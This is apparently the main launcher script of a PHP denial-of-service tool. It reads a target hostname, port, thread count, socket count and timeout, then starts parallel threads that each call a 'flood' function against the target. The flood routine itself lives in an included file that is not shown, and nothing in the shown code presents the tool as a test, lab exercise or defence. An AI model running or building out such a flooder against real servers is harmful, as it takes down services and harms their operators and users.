<?php

include __DIR__ . '/functions.php.inc';

$listOfSockets                                           = [];
[$hostname, $port, $threadCount, $socketCount, $timeout] = validateArguments($argv);

registerSignals($listOfSockets);

$futures  = [];

do {
    for ($i = 1; $i < $threadCount + 1; $i++) {
        echo "Starting thread $i..." . PHP_EOL;

        $runtime   = new \parallel\Runtime();
        $futures[] = $runtime->run(static function() use ($hostname, $port, $socketCount, $timeout, $listOfSockets) {
            include __DIR__ . '/functions.php.inc';

            flood($hostname, $port, $socketCount, $timeout, $listOfSockets);
        });
    }

    waitForFutures($futures, $threadCount);
} while (\count($futures) > 0);

